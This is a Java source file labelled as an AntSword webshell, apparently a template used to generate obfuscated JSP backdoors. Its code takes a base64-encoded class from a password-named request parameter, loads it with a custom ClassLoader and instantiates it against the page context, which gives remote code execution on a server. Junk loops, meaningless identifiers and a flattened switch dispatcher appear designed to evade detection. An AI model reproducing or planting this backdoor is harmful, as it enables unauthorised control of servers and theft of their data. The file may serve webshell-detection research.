package org.sec;

/**
 * 蚁剑Webshell
 */
public class Ant {
    public static void main(String[] args) {
        String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13", "__PASSWORD__"};
        String temp = globalArr[0];
        String[] b = temp.split("\\|");

        String cls = null;
        ClassLoader loader = null;
        U u = null;
        byte[] b1 = null;
        Class c = null;
        Object o = null;

        int index = 0;
        while (index < 9) {
            int op = Integer.parseInt(b[index++]);
            switch (op) {
                case 0:
                    cls = request.getParameter(globalArr[1]);
                    break;
                case 1:
                    if (cls == null) {
                        return;
                    }
                    break;
                case 2:
                    loader = this.getClass().getClassLoader();
                    break;
                case 3:
                    u = new U(loader);
                    break;
                case 4:
                    b1 = base64Decode(cls);
                    break;
                case 5:
                    c = u.qwer(b1);
                    break;
                case 6:
                    o = c.newInstance();
                    break;
                case 7:
                    o.equals(pageContext);
                    break;
                case 8:
                    for (int i = 0; i < 10; i++) {
                        if (i == 9) {
                            break;
                        }
                    }
                    break;
            }
        }
    }

    class U extends ClassLoader {
        U(ClassLoader sjqhdnqocals) {
            super(sjqhdnqocals);
            for (int i = 0; i < 10; i++) {
                if (i == 9) {
                    break;
                }
            }
        }

        private int dsaENLANCL() {
            for (int i = 0; i < 10; i++) {
                if (i == 9) {
                    break;
                }
            }
            return 0;
        }

        public Class qwer(byte[] dqwbdjk) {
            if (dqwbdjk.length == 100) {
                for (int i = 0; i < 10; i++) {
                    if (i == 9) {
                        break;
                    }
                }
            }
            int test = dqwbdjk.length;
            if (test > 10) {
                for (int j = 0; j < 10; j++) {
                    if (j == 9) {
                        break;
                    }
                }
            }
            byte[] akui = dqwbdjk;
            Class c = super.defineClass(akui, 0, akui.length);
            if (c.isInterface()) {
                c.getName();
            }
            return c;
        }
    }
}